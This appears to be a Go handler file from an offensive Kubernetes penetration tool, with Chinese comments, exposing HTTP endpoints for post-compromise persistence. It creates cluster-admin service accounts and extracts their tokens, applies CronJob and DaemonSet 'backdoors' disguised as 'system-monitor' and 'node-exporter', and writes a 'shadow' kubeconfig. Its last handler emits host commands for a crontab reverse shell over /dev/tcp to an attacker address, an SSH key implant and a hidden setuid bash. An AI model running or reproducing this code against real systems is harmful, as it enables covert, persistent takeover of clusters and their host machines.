package handler

import (
	"context"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/trymonoly/K8sPenTool-ng/internal/kubectl"
	corev1 "k8s.io/api/core/v1"
	rbacv1 "k8s.io/api/rbac/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

type PersistHandler struct{}

func NewPersistHandler() *PersistHandler { return &PersistHandler{} }

// CreateAdminSA 直接用 client-go 创建 SA + ClusterRoleBinding（无 kubectl 二进制依赖）
func (h *PersistHandler) CreateAdminSA(c *gin.Context) {
	var req struct {
		TargetHost  string `json:"target_host" binding:"required"`
		Namespace   string `json:"namespace"`
		SAName      string `json:"sa_name"`
		BindingName string `json:"binding_name"`
		Token       string `json:"token"`
		Username    string `json:"username"`
		Password    string `json:"password"`
		TimeoutSec  int    `json:"timeout_sec"`
		SkipTLS     bool   `json:"skip_tls"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.Namespace == "" {
		req.Namespace = "kube-system"
	}
	if req.SAName == "" {
		req.SAName = "admin-user"
	}
	if req.BindingName == "" {
		req.BindingName = "admin-bind"
	}
	if req.TimeoutSec == 0 {
		req.TimeoutSec = 10
	}

	client, err := buildK8sClient(req.TargetHost, req.Token, req.Username, req.Password, req.SkipTLS)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}

	ctx, cancel := context.WithTimeout(c.Request.Context(), time.Duration(req.TimeoutSec)*time.Second)
	defer cancel()

	sa := &corev1.ServiceAccount{
		ObjectMeta: metav1.ObjectMeta{Name: req.SAName, Namespace: req.Namespace},
	}
	crb := &rbacv1.ClusterRoleBinding{
		ObjectMeta: metav1.ObjectMeta{Name: req.BindingName},
		RoleRef:    rbacv1.RoleRef{APIGroup: "rbac.authorization.k8s.io", Kind: "ClusterRole", Name: "cluster-admin"},
		Subjects:   []rbacv1.Subject{{Kind: "ServiceAccount", Name: req.SAName, Namespace: req.Namespace}},
	}

	saResult, saErr := client.CreateServiceAccount(ctx, req.Namespace, sa)
	crbResult, crbErr := client.CreateClusterRoleBinding(ctx, crb)

	saYAML, bindingYAML := kubectl.BuildAdminSAYAML(req.Namespace, req.SAName, req.BindingName)
	c.JSON(http.StatusOK, gin.H{
		"yaml":      saYAML + "\n---\n" + bindingYAML,
		"sa":        fmt.Sprintf("%v", saResult),
		"crb":       fmt.Sprintf("%v", crbResult),
		"sa_error":  errStr(saErr),
		"crb_error": errStr(crbErr),
	})
}

// GetSAToken 用 client-go 读取 SA 关联的 Secret token
func (h *PersistHandler) GetSAToken(c *gin.Context) {
	var req struct {
		TargetHost string `json:"target_host" binding:"required"`
		Namespace  string `json:"namespace"`
		SAName     string `json:"sa_name"`
		Token      string `json:"token"`
		Username   string `json:"username"`
		Password   string `json:"password"`
		TimeoutSec int    `json:"timeout_sec"`
		SkipTLS    bool   `json:"skip_tls"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.Namespace == "" {
		req.Namespace = "kube-system"
	}
	if req.TimeoutSec == 0 {
		req.TimeoutSec = 10
	}

	client, err := buildK8sClient(req.TargetHost, req.Token, req.Username, req.Password, req.SkipTLS)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}

	ctx, cancel := context.WithTimeout(c.Request.Context(), time.Duration(req.TimeoutSec)*time.Second)
	defer cancel()

	// 枚举 secrets，找到匹配 SA 的 token secret
	secretList, err := client.ListSecrets(ctx, req.Namespace)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}

	for _, s := range secretList.Items {
		if s.Type == corev1.SecretTypeServiceAccountToken &&
			s.Annotations["kubernetes.io/service-account.name"] == req.SAName {
			token, ok := s.Data["token"]
			if ok {
				c.JSON(http.StatusOK, gin.H{"output": string(token), "source": "secret"})
				return
			}
		}
	}

	token, tokenErr := client.CreateServiceAccountToken(ctx, req.Namespace, req.SAName, 3600)
	if tokenErr == nil {
		c.JSON(http.StatusOK, gin.H{"output": token, "source": "tokenrequest"})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"error": fmt.Sprintf("No token secret found for SA %s in %s, and TokenRequest failed: %v", req.SAName, req.Namespace, tokenErr),
	})
}

// GenerateCronJob 生成 CronJob YAML，并通过 client-go 直接创建
func (h *PersistHandler) GenerateCronJob(c *gin.Context) {
	var req struct {
		TargetHost string `json:"target_host" binding:"required"`
		Namespace  string `json:"namespace"`
		Name       string `json:"name"`
		Image      string `json:"image"`
		Schedule   string `json:"schedule"`
		Command    string `json:"command"`
		Apply      bool   `json:"apply"`
		Token      string `json:"token"`
		Username   string `json:"username"`
		Password   string `json:"password"`
		TimeoutSec int    `json:"timeout_sec"`
		SkipTLS    bool   `json:"skip_tls"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.Namespace == "" {
		req.Namespace = "kube-system"
	}
	if req.Name == "" {
		req.Name = "system-monitor"
	}
	if req.Schedule == "" {
		req.Schedule = "*/10 * * * *"
	}
	if req.Image == "" {
		req.Image = "alpine"
	}
	if req.Command == "" {
		req.Command = "while true; do sleep 3600; done"
	}
	if req.TimeoutSec == 0 {
		req.TimeoutSec = 10
	}

	cronJob := kubectl.BuildCronJobBackdoor(req.Name, req.Namespace, req.Image, req.Schedule, req.Command)
	yaml, yamlErr := kubectl.BuildCronJobBackdoorYAML(req.Name, req.Namespace, req.Image, req.Schedule, req.Command)
	if yamlErr != nil {
		c.JSON(http.StatusOK, gin.H{"error": yamlErr.Error()})
		return
	}
	if !req.Apply {
		c.JSON(http.StatusOK, gin.H{
			"yaml":      yaml,
			"generated": true,
			"applied":   false,
			"preview":   true,
		})
		return
	}

	client, err := buildK8sClient(req.TargetHost, req.Token, req.Username, req.Password, req.SkipTLS)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"yaml": yaml, "error": err.Error()})
		return
	}
	ctx, cancel := context.WithTimeout(c.Request.Context(), time.Duration(req.TimeoutSec)*time.Second)
	defer cancel()
	result, applyErr := client.ApplyCronJob(ctx, req.Namespace, cronJob)
	c.JSON(http.StatusOK, gin.H{"yaml": yaml, "applied": result, "error": errStr(applyErr)})
}

// GenerateDaemonSet 生成 DaemonSet YAML，并通过 client-go 直接创建
func (h *PersistHandler) GenerateDaemonSet(c *gin.Context) {
	var req struct {
		TargetHost string `json:"target_host" binding:"required"`
		Namespace  string `json:"namespace"`
		Name       string `json:"name"`
		Image      string `json:"image"`
		MountPath  string `json:"mount_path"`
		Command    string `json:"command"`
		Apply      bool   `json:"apply"`
		Token      string `json:"token"`
		Username   string `json:"username"`
		Password   string `json:"password"`
		TimeoutSec int    `json:"timeout_sec"`
		SkipTLS    bool   `json:"skip_tls"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.Namespace == "" {
		req.Namespace = "kube-system"
	}
	if req.Name == "" {
		req.Name = "node-exporter"
	}
	if req.Image == "" {
		req.Image = "alpine"
	}
	if req.MountPath == "" {
		req.MountPath = "/host"
	}
	if req.Command == "" {
		req.Command = "while true; do sleep 3600; done"
	}
	if req.TimeoutSec == 0 {
		req.TimeoutSec = 10
	}

	daemonSet := kubectl.BuildDaemonSetBackdoor(req.Name, req.Namespace, req.Image, req.MountPath, req.Command)
	yaml, yamlErr := kubectl.BuildDaemonSetBackdoorYAML(req.Name, req.Namespace, req.Image, req.MountPath, req.Command)
	if yamlErr != nil {
		c.JSON(http.StatusOK, gin.H{"error": yamlErr.Error()})
		return
	}
	if !req.Apply {
		c.JSON(http.StatusOK, gin.H{
			"yaml":      yaml,
			"generated": true,
			"applied":   false,
			"preview":   true,
		})
		return
	}

	client, err := buildK8sClient(req.TargetHost, req.Token, req.Username, req.Password, req.SkipTLS)
	resp := gin.H{"yaml": yaml}
	if err != nil {
		resp["error"] = err.Error()
		c.JSON(http.StatusOK, resp)
		return
	}
	ctx, cancel := context.WithTimeout(c.Request.Context(), time.Duration(req.TimeoutSec)*time.Second)
	defer cancel()
	result, applyErr := client.ApplyDaemonSet(ctx, req.Namespace, daemonSet)
	resp["applied"] = result
	if applyErr != nil {
		resp["error"] = applyErr.Error()
	}
	c.JSON(http.StatusOK, resp)
}

// GenerateKubeconfig 生成 shadow kubeconfig（仅生成 YAML，无 kubectl 依赖）
func (h *PersistHandler) GenerateKubeconfig(c *gin.Context) {
	var req struct {
		Server  string `json:"server" binding:"required"`
		Cluster string `json:"cluster"`
		Token   string `json:"token" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.Cluster == "" {
		req.Cluster = "pwned-cluster"
	}
	server := normalizeKubeconfigServer(req.Server)

	kcfg := fmt.Sprintf(`apiVersion: v1
kind: Config
current-context: %[2]s
clusters:
- cluster:
    insecure-skip-tls-verify: true
    server: %[1]s
  name: %[2]s
contexts:
- context:
    cluster: %[2]s
    user: admin
  name: %[2]s
users:
- name: admin
 user:
    token: %[3]s
`, server, req.Cluster, req.Token)
	c.JSON(http.StatusOK, gin.H{"kubeconfig": kcfg})
}

func normalizeKubeconfigServer(server string) string {
	s := strings.TrimSpace(server)
	if s == "" {
		return ""
	}
	if !strings.Contains(s, "://") {
		s = "https://" + s
	}
	u, err := url.Parse(s)
	if err != nil {
		return s
	}
	if u.Host == "" && u.Path != "" {
		u.Host = u.Path
		u.Path = ""
	}
	if u.Scheme == "" {
		u.Scheme = "https"
	}
	if u.Host != "" && u.Port() == "" {
		u.Host = net.JoinHostPort(u.Hostname(), "6443")
	}
	return u.String()
}

// GenerateHostPersistence 生成宿主机持久化命令（仅输出命令，无 kubectl 依赖）
func (h *PersistHandler) GenerateHostPersistence(c *gin.Context) {
	var req struct {
		LHost string `json:"lhost" binding:"required"`
		LPort string `json:"lport" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	cmds := []string{
		fmt.Sprintf("echo '*/5 * * * * root /bin/bash -c \"/bin/bash -i >& /dev/tcp/%s/%s 0>&1\"' >> /mnt/etc/crontab", req.LHost, req.LPort),
		fmt.Sprintf("mkdir -p /mnt/root/.ssh && echo 'ssh-rsa ...' >> /mnt/root/.ssh/authorized_keys"),
		fmt.Sprintf("cp /bin/bash /mnt/tmp/.hidden-bash && chmod u+s /mnt/tmp/.hidden-bash"),
	}
	c.JSON(http.StatusOK, gin.H{"commands": cmds})
}
